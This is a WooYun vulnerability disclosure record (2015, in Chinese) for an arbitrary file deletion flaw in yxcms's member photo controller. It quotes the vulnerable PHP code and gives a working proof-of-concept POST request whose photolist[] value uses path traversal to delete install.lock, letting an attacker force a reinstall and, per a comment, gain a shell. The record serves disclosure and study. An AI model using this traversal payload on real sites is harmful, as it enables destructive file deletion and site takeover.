{"id": 29821, "wybug_id": "wooyun-2015-0118193", "wybug_title": "yxcms任意文件删除漏洞（可导致重装）", "wybug_corp": "yxcms.net", "wybug_author": "不能忍", "wybug_date": "2015-06-04 18:39", "wybug_open_date": "2015-09-05 20:30", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件删除的猥琐利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-10：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-05：\t细节向公众公开  简要描述： yxcms一处任意文件删除漏洞 详细说明：  漏洞文件：/protected/apps/member/controller/photocontroller.phppublic function add()\t{\t\tif(!$this->isPost()){\t\t\t$sortlist=model('sort')->select('','id,name,deep,tplist,path,norder,type');\t\t\tif(empty($sortlist)) $this->error('请先添加图集栏目~',url('sort/photoadd'));\t\t\t$sortlist=re_sort($sortlist);            foreach($sortlist as $vo){            \tif($this->checkConPower($vo['id'])){                    $ct=explode(',',$vo['tplist']);\t\t\t\t    $tpco[$vo['path'].','.$vo['id']]=$ct[1];                    $space = str_repeat('├┈┈┈', $vo['deep']-1);                     $disable=($this->sorttype==$vo['type'])?'':'disabled=\"disabled\" style=\"background-color:#F0F0F0\"';                        $option.= '<option '.$disable.' value=\"'.$vo['path'].','.$vo['id'].'\">'.$space.$vo ['name'].'</option>';                }            }            $this->option=$option;\t\t\t$this->tpc=json_encode($tpco);//默认模板处理            //$places=model('place')->select('','','norder DESC');//定位\t\t\t// $this->places=$places;\t\t\t$this->sortlist=$sortlist;\t\t\t$this->type=$this->sorttype;\t\t\t$this->twidth=config('thumbMaxwidth');\t\t\t$this->theight=config('thumbMaxheight');\t\t\t$this->picpath=__ROOT__.'/upload/photos/';\t\t\t$this->display();\t\t}else{\t\t\tif(empty($_POST['sort'])||empty($_POST['title'])||empty($_POST['tpcontent']))\t\t\t$this->error('请填写完整的信息~');\t\t\t$data=array();\t\t\t//扩展模型开始\t\t\tif (!empty($_POST['tableid'])) {\t\t\t\t$tableid = intval($_POST['tableid']);\t\t\t\t$info = model('extend')->find(\"id='{$tableid}'\",'tableinfo'); //查询表\t\t\t\t$list = model('extend')->select(\"pid='{$tableid}'\",'','id desc'); //查询表中字段\t\t\t\tforeach ($list as $vo) {\t\t\t\t\tif (!empty($vo['tableinfo'])) {\t\t\t\t\t\tif(is_array($_POST['ext_'.$vo['tableinfo']]))\t\t\t\t\t\t\t$fvalue=implode(',',$_POST['ext_'.$vo['tableinfo']]);\t\t\t\t\t\telse\t\t\t\t\t\t    $fvalue=in($_POST['ext_'.$vo['tableinfo']]);\t\t\t\t\t\t$ex_data[$vo['tableinfo']] = empty($fvalue)?$vo['defvalue']:$fvalue; //循环post字段\t\t\t\t\t}\t\t\t\t}\t\t\t\t$extfield=model('extend')->Extin($info['tableinfo'],$ex_data);\t\t\t\t$data['extfield']=$extfield;\t\t\t}\t\t\t//扩展模型结束\t\t\t$data['account']=$this->mesprefix.$this->auth['account'];\t\t\t$data['sort']=$_POST['sort'];\t\t\t$data['exsort']=empty($_POST['exsort'])?'':implode(',',$_POST['exsort']);\t\t\t$data['title']=in($_POST['title']);\t\t\t$data['keywords']=in($_POST['keywords']);\t\t\t$data['picture']=$_POST['picture'];\t\t\t$data['description']=in($_POST['description']);\t\t\t$data['content']=in($_POST['content']);\t\t\t$data['method']='photo/content';\t\t\t$data['tpcontent']=in($_POST['tpcontent']);\t\t\t$data['ispass']=0;\t\t\t$data['recmd']=0;\t\t\t$data['hits']=0;\t\t\t$data['norder']=0;\t\t\t$data['addtime']=time();            // if (empty($data['description'])) {            //      $data['description']=in(substr(deletehtml($_POST['content']), 0, 250)); //自动提取描述               // }            // if(empty($data['keywords'])){                //     $data['keywords']= $this->getkeyword($data['title'].$data['description']); //自动获取中文关键词             //     if(empty($data['keywords'])) $data['keywords']=str_replace(' ',',',$data['description']);//非中文            // }            // if($_POST['iftag']) {            //  \t$iftag = $this->crtags($data['keywords']);            //  \tif(!$iftag) $this->alert('标签生成失败~');            //  }\t\t\tif(!empty($_POST['photolist']))\t\t\t$data['photolist']=implode(',',$_POST['photolist']);\t\t\tif(!empty($_POST['conlist']))\t\t\t$data['conlist']=implode(',',in($_POST['conlist']));\t\t\tif(model('photo')->insert($data)){\t\t\t$this->success('图集添加成功~',url('photo/index'));\t\t\t}\t\t\telse $this->error('图集添加失败');\t\t}\t}这里有一个添加图集的方法看到：$data['photolist']=implode(',',$_POST['photolist']);这里直接获取图片列表，然后插库。在同一个文件里还有一处删除的方法：\tpublic function del()\t{\t\t$path=$this->uploadpath;\t\tif(!$this->isPost()){\t\t\t$id=intval($_GET['id']);\t\t\tif(empty($id)) echo '参数错误~';\t\t\telse{\t\t\t\t$photos=model('photo')->find(\"id='$id'\",'photolist,sort,extfield,account');\t\t\t\tif($photos['account']!=$this->mesprefix.$this->auth['account']){\t\t\t\t\techo '请不要越权编辑其他用户信息~';\t\t\t\t\treturn;\t\t\t\t} \t\t\t\t$sortid=substr($photos['sort'],-6,6);\t\t\t\t$exid=model('sort')->find(\"id='{$sortid}'\",'extendid');\t\t\t\tif($exid['extendid']!=0){\t\t\t\t\t$table=model('extend')->find(\"id='{$exid['extendid']}'\",'tableinfo');\t\t\t\t\tif(!empty($table['tableinfo'])){\t\t\t\t\t\tif(!($this->model->table($table['tableinfo'])->where(\"id='{$photos['extfield']}'\")->delete())){//删除拓展表中关联信息\t\t\t\t\t\t   echo '删除拓展信息失败~';\t\t\t\t\t\t   return;\t\t\t\t\t   }\t\t\t\t\t}\t\t\t\t\t\t\t\t\t}\t\t\t\tif(!empty($photos['photolist'])){\t\t\t\t\t$phoarr=explode(',',$photos['photolist']);\t\t\t\t\tforeach ($phoarr as $vo){\t\t\t\t\t\tif(file_exists($path.$vo))\t\t\t\t\t\t@unlink($path.$vo);\t\t\t\t\t\tif(file_exists($path.'thumb_'.$vo))\t\t\t\t\t\t@unlink($path.'thumb_'.$vo);\t\t\t\t\t}\t\t\t\t}\t\t\t\tif(model('photo')->delete(\"id='$id'\"))\t\t\t\techo 1;\t\t\t\telse echo '删除失败~';看到这里有$path=$this->uploadpath;在类的初始化有个$this->uploadpath=ROOT_PATH.'upload/photos/';也就是说install.lock文件的路径就会是：../../protected/apps/install/install.lock要先跳出上传路径然后才能找到install.lock文件的位置：我们回到这个删除方法：$photos=model('photo')->find(\"id='$id'\",'photolist,sort,extfield,account');这里把我们刚刚输入的photolist提取了出来。if(!empty($photos['photolist'])){\t\t\t\t\t$phoarr=explode(',',$photos['photolist']);\t\t\t\t\tforeach ($phoarr as $vo){\t\t\t\t\t\tif(file_exists($path.$vo))\t\t\t\t\t\t@unlink($path.$vo);\t\t\t\t\t\tif(file_exists($path.'thumb_'.$vo))判断了photolist存在就遍历数组进行删除。也就是说我们之前插入的photolist被提取了出来遍历进行删除。也就达到了任意文件删除的条件。   漏洞证明：  利用方法，注册一个会员然后添加一个图集。提交:POST /index.php?r=member/photo/add HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://localhost/index.php?r=member/photo/addCookie: bbs_sid=34cf0a07df3b79fb; a8850_times=1; PHPSESSID=70a6e5039d8221ea68474b07eaef8db4; yx_auth=cb4772IT9B%2FSSgobsYj8GrQvKTHczJmS4ZxPdpN58dJKU360qdaxppL9eHsyfxoEN2ThpZKPZ%2FUPuCTcSKajRgConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 287sort=%2C000000%2C100002%2C100007&title=testtest3&sort=sef&picture=teste&keywords=testes&description=testes&ifthumb=1&thumbtype=1&width=145&height=110&content=sefsesfes&tpcontent=photo_content&photolist[]=../../protected/apps/install/install.lock然后点击删除\n\n之后就能删除安装文件了！   修复方案：  验证   版权声明：转载请注明来源 不能忍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2015-06-07 20:28 厂商回复： 谢谢关注 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-05 09:05 |    \t\t不能忍 \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:16        | 不要关注我，给我钱就好。)\t\t \n  重装可getshell    \n     2015-06-15 11:04 |    \t\th3hz \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:1        | 新手求收留)\t\t \n  protected\\apps\\member\\controller\\inforcontroller.php 第 40行 不知道是不是这一处，为啥我在你前面提交的我没通过。重装破坏太大 我就没找实例而已    \n     2015-06-15 11:55 |    \t\t不能忍 \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:16        | 不要关注我，给我钱就好。)\t\t \n  @h3hz 我的不是这个，我的是要先入库出库再遍历删除的！    \n     2015-06-22 09:02 |    \t\t不能忍 \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:16        | 不要关注我，给我钱就好。)\t\t \n  @h3hz 你说的好像是这个 WooYun: YXcms最新版任意文件删除漏洞    \n     2015-08-03 17:58 |    \t\ttodaro \t\t\t( 实习白帽子  |\t\t\t        Rank:39 漏洞数:12        | 完结。)\t\t \n  @yxcms.net 这个还有一个问题就是没有过滤..\\..\\，所以还是可以删除。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}